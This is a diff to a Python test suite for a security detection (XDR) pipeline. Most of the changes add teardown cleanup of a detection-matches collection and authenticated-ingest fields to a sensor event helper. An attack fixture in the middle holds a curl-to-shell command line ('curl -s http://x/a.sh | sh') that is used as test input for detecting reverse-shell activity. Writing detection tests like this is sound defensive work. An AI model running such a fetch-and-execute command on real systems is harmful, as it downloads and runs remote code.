@@ -202,6 +202,7 @@ async def test_real_endpoint_event_traverses_the_existing_pipeline():
         assert "created" in out["incident"]
     finally:
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["xdr_detection_matches"].delete_many({"tenant_id": tenant})
         client.close()
 
 
@@ -246,6 +247,7 @@ async def test_bridge_records_the_detection_outcome_on_the_raw_event():
         await db[COLLECTION].delete_many({"tenant_id": tenant})
         await db["v2_shadow_observations"].delete_many({"tenant_id": tenant})
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["xdr_detection_matches"].delete_many({"tenant_id": tenant})
         client.close()
 
 
@@ -290,6 +292,7 @@ async def test_a_detection_fault_never_destroys_the_evidence_record():
         await db[COLLECTION].delete_many({"tenant_id": tenant})
         await db["v2_shadow_observations"].delete_many({"tenant_id": tenant})
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["xdr_detection_matches"].delete_many({"tenant_id": tenant})
         client.close()
 
 
@@ -392,6 +395,7 @@ async def test_a_critical_endpoint_detection_reaches_a_real_incident():
         assert case["doc_type"] == "xdr_incident"
     finally:
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["xdr_detection_matches"].delete_many({"tenant_id": tenant})
         await db["workspace_cases"].delete_many({"tenant_id": tenant})
         client.close()
 
@@ -419,6 +423,7 @@ async def test_a_benign_endpoint_event_never_becomes_an_incident():
             {"tenant_id": tenant}) == 0
     finally:
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["xdr_detection_matches"].delete_many({"tenant_id": tenant})
         client.close()
 
 
@@ -431,7 +436,16 @@ def _sensor_ev(cmd, image, pid, endpoint="ep_camp1", host="lab-linux-01"):
             "image_path": image, "command_line": cmd, "user": "root",
             "collection_method": "PROC_POLL",
             "parent_lookup_state": "OBSERVED", "parent_image": "sshd",
-            "endpoint_id": endpoint, "hostname": host}
+            "endpoint_id": endpoint, "hostname": host,
+            # G-29/G-30 · the endpoint identity is established by the
+            # AUTHENTICATED ingest boundary (exactly as
+            # `canonical_bridge` does on the real path), never by the
+            # `endpoint_id` field sitting in the event body.
+            "_authenticated_ingest": {
+                "trust_state": "AUTHENTICATED",
+                "source_kind": "REAL_SENSOR_DERIVED",
+                "sensor_version": "1.4.2",
+                "authenticated_endpoint_id": endpoint}}
 
 
 _ATTACK = [("/bin/bash -c curl -s http://x/a.sh | sh", "/usr/bin/bash", 31),
@@ -483,6 +497,7 @@ async def test_one_endpoint_attack_becomes_one_incident_with_all_evidence():
         assert case["title"].startswith("Reverse-shell shaped command line")
     finally:
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["xdr_detection_matches"].delete_many({"tenant_id": tenant})
         await db["workspace_cases"].delete_many({"tenant_id": tenant})
         client.close()
 
@@ -510,6 +525,7 @@ async def test_two_endpoints_never_merge_even_on_the_same_rule():
             {"tenant_id": tenant}) == 2
     finally:
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["xdr_detection_matches"].delete_many({"tenant_id": tenant})
         await db["workspace_cases"].delete_many({"tenant_id": tenant})
         client.close()
 
@@ -548,6 +564,7 @@ async def test_a_later_unrelated_attack_is_its_own_incident():
             {"tenant_id": tenant}) == 2
     finally:
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["xdr_detection_matches"].delete_many({"tenant_id": tenant})
         await db["workspace_cases"].delete_many({"tenant_id": tenant})
         client.close()
 
@@ -579,6 +596,7 @@ async def test_a_closed_incident_is_never_silently_reopened():
             {"tenant_id": tenant}) == 2
     finally:
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["xdr_detection_matches"].delete_many({"tenant_id": tenant})
         await db["workspace_cases"].delete_many({"tenant_id": tenant})
         client.close()
 
